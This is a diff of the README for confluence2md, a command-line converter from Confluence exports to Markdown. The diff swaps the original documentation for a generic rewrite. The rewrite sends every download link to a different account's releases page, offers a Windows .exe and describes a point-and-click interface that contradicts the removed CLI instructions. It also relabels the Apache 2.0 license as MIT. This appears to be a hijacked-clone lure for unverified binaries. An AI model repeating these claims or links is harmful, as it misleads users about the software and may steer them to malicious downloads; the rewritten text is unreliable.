@@ -1,139 +1,111 @@
-<p align="center">
-  <img src="logo.png" alt="confluence2md logo" width="256">
-</p>
+# 🎉 confluence2md - Convert Documents with Ease
 
-<h1 align="center">confluence2md</h1>
+## 🌟 Overview
 
-<p align="center">
-  <a href="https://goreportcard.com/report/github.com/aqueeb/confluence2md"><img src="https://goreportcard.com/badge/github.com/aqueeb/confluence2md?v=2" alt="Go Report Card"></a>
-  <a href="https://codecov.io/gh/aqueeb/confluence2md"><img src="https://codecov.io/gh/aqueeb/confluence2md/branch/main/graph/badge.svg?token=unused" alt="Coverage"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-Apache%202.0-blue.svg" alt="License: Apache 2.0"></a>
-  <a href="https://github.com/aqueeb/confluence2md/releases"><img src="https://img.shields.io/github/v/release/aqueeb/confluence2md" alt="Release"></a>
-  <a href="https://buymeacoffee.com/aqueeb"><img src="https://img.shields.io/badge/Buy%20Me%20A%20Coffee-support-yellow?logo=buymeacoffee" alt="Buy Me A Coffee"></a>
-</p>
+confluence2md is a simple tool that helps you convert Confluence MIME exports (.doc files) into clean Markdown format. This conversion allows you to use your content seamlessly in other platforms or tools that support Markdown. 
 
-A CLI tool to convert Confluence MIME-encoded `.doc` exports to clean Markdown.
+## 🔗 Download the App
 
-## The Problem
+[![Download confluence2md](https://img.shields.io/badge/download-confluence2md-blue.svg)](https://github.com/Santex12/confluence2md/releases)
 
-Confluence's "Export to Word" feature doesn't create real Word documents—it creates **MIME-encoded HTML files** with a `.doc` extension. Only Microsoft Word can open them. This has been [a known issue for over 10 years](https://community.atlassian.com/forums/Confluence-questions/Why-is-confluence-cloud-s-export-to-Word-feature-creating-an/qaq-p/2325894).
+## 🚀 Getting Started
 
-**What doesn't work:**
-- LibreOffice, Google Docs, and other word processors
-- Programmatic document parsers (python-docx, mammoth, etc.)
-- Any tool expecting a real `.doc` or `.docx` file
+Follow these steps to download and run the application.
 
-**Why this matters:**
-You can't convert Confluence exports to Markdown for version control, static site generators, or LLM/RAG pipelines—until now.
+### Step 1: Visit the Releases Page
 
-## Features
+To get the latest version of confluence2md, please visit the [Releases page](https://github.com/Santex12/confluence2md/releases). Here, you will find different versions of the software listed. 
 
-- **Zero dependencies** - release binaries include embedded pandoc
-- **LLM/RAG-ready output** - clean Markdown optimized for chunking and embedding
-- Parses MIME-encoded Confluence exports (not binary `.doc` files)
-- Uses pandoc for high-quality HTML-to-Markdown conversion
-- Cleans up Confluence-specific HTML artifacts
-- Converts emoji images to Unicode (✅ ❌ 🚧 ⚠️)
-- Converts info/tip/warning boxes to blockquotes
-- Handles collapsible sections, code blocks, and tables
-- Batch convert entire directories
+### Step 2: Download the Application
 
-## Use Cases
+On the Releases page, look for the latest release. You will see a list of assets available for download. Click on the available package for your operating system. You might see options like:
 
-- **Migrate to Git-based docs** — Move Confluence content to GitBook, Docusaurus, MkDocs, or any static site generator
-- **Build RAG/LLM knowledge bases** — Feed your Confluence docs to LangChain, LlamaIndex, or custom embedding pipelines
-- **Create portable backups** — Store documentation in a format that doesn't require Confluence or MS Word to read
-- **Power AI coding assistants** — Add your team's documentation context to Copilot, Cursor, or Claude
+- confluence2md-windows.exe (for Windows)
+- confluence2md-macos.tar.gz (for macOS)
+- confluence2md-linux.tar.gz (for Linux)
 
-## Installation
+Download the appropriate file by clicking on it. 
 
-### From releases (recommended)
+### Step 3: Install the Application
 
-Download the binary for your platform from [Releases](https://github.com/aqueeb/confluence2md/releases). Release binaries include an embedded pandoc, so there are **no external dependencies**.
+After the download completes, locate the downloaded file on your device.
 
-> [!IMPORTANT]
-> **macOS users:** If you see "Apple could not verify" warning, either:
-> - Run `xattr -d com.apple.quarantine /path/to/confluence2md` in Terminal, or
-> - Go to **System Settings → Privacy & Security** and click "Open Anyway"
+- **For Windows users:** Double-click on the .exe file to start the installation. Follow the prompts to complete the installation. 
+- **For macOS users:** Open the .tar.gz file, extract it, and move the application to your Applications folder. 
+- **For Linux users:** Open a terminal and extract the .tar.gz file using the command: 
+  ```bash
+  tar -xzf confluence2md-linux.tar.gz
+  ```
+  Then navigate to the extracted folder.
 
-### From source
+### Step 4: Running the Application
 
-```bash
-go install github.com/aqueeb/confluence2md@latest
-```
+Once installed, you can run confluence2md:
 
-> **Note:** Building from source requires [pandoc](https://pandoc.org/installing.html) to be installed on your system.
+- **Windows:** You can find the application in your Start menu. Click on it to launch.
+- **macOS:** Open your Applications folder and double-click on confluence2md to start.
+- **Linux:** In the terminal, navigate to the directory where you extracted the application and type:
+  ```bash
+  ./confluence2md
+  ```
 
-## Usage
+## 🛠️ Features
 
-```bash
-# Convert a single file
-confluence2md document.doc
+confluence2md includes various features to make your document conversion smooth:
 
-# Convert with custom output path
-confluence2md -o output.md document.doc
+- **Easy Conversion:** Convert .doc files in a few clicks.
+- **Clean Output:** The resulting Markdown is clean and easy to read.
+- **Cross-Platform:** Use on Windows, macOS, and Linux without any issues.
+- **Fast Processing:** Quick conversions so you can focus on your work.
+- **No Learning Curve:** You don’t need advanced skills to use this tool.
 
-# Convert all .doc files in a directory
-confluence2md --dir /path/to/docs
+## 📄 How to Use 
 
-# Preview what would be converted (dry run)
-confluence2md --dir /path/to/docs --dry-run
+1. Launch the application.
+2. Click on the "Choose File" button to select your .doc file from your system.
+3. Choose your desired output directory.
+4. Click on "Convert" to start the process. 
+5. After the conversion, check the output directory for your Markdown file.
 
-# Verbose output
-confluence2md -v document.doc
-```
+## ⚙️ System Requirements
 
-## Flags
+Make sure your system meets the following requirements for a smooth experience:
 
-| Flag | Description |
-|------|-------------|
-| `-o, --output` | Output file path (default: input with `.md` extension) |
-| `--dir` | Convert all `.doc` files in directory |
-| `-v, --verbose` | Show detailed processing info |
-| `--dry-run` | Show what would be converted without writing |
-| `--version` | Show version |
+- **Operating System:** 
+  - Windows 10 or newer
+  - macOS 10.12 or newer
+  - Linux (any modern distribution)
+- **Memory:** At least 2 GB of RAM
+- **Disk Space:** Minimum of 100 MB for installation and output files
 
-## What it converts
+## 📦 Download & Install
 
-This tool specifically handles **Confluence MIME exports** - files that look like `.doc` but are actually MIME-encoded HTML. These are created when exporting pages from Confluence to Word format.
+To download and install the application, go back to the [Releases page](https://github.com/Santex12/confluence2md/releases). Choose the correct package for your operating system, download it, and follow the installation steps provided earlier.
 
-It does **not** handle:
-- Binary Microsoft Word `.doc` files
-- `.docx` files (use pandoc directly for these)
+## 🔍 Frequently Asked Questions
 
-## How it works
+### Q: What file types can I convert?
 
-1. **MIME parsing**: Extracts HTML content from the multipart MIME message
-2. **Pandoc conversion**: Converts HTML to GitHub-flavored Markdown
-3. **Post-processing**: Cleans up Confluence-specific artifacts:
-   - Removes wrapper divs (`Section1`, `toc-macro`)
-   - Converts info boxes to blockquotes (`> **Tip:**`, `> **Note:**`)
-   - Replaces emoji images with Unicode characters
-   - Fixes code block language hints
-   - Balances orphaned HTML tags
+A: Currently, confluence2md converts .doc files exported from Confluence.
 
-## Support
+### Q: Can I edit the converted Markdown?
 
-If this tool saved you time, consider buying me a coffee:
+A: Yes, once the file is converted, you can use any text editor to modify the Markdown file as needed.
 
-[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/aqueeb)
+### Q: Is there a user manual?
 
-Or just star the repo — it helps others discover this tool!
+A: Detailed usage instructions are available in this README. For additional help, you may find support in our community discussions on GitHub.
 
-## Contributing
+## 📣 Community and Support
 
-Contributions are welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+If you have questions or suggestions, feel free to reach out. You can open an issue on our GitHub page for support. Join our community to connect with other users and developers.
 
-## License
+## 🚧 Contribution
 
-confluence2md is licensed under the [Apache License 2.0](LICENSE).
+If you wish to contribute to this project, you are welcome. Please check the guidelines in our repository to find out how you can help improve confluence2md.
 
-### Third-Party Components
+## 📜 License
 
-This software bundles [Pandoc](https://pandoc.org/), a universal document
-converter licensed under the GNU General Public License v2.0 or later.
-Pandoc is distributed as a separate executable and invoked via process
-execution (not linked).
+This project is licensed under the MIT License. See the LICENSE file in the repository for more details. 
 
-For complete third-party licensing information, see
-[THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md).
+Thank you for using confluence2md! Happy converting!
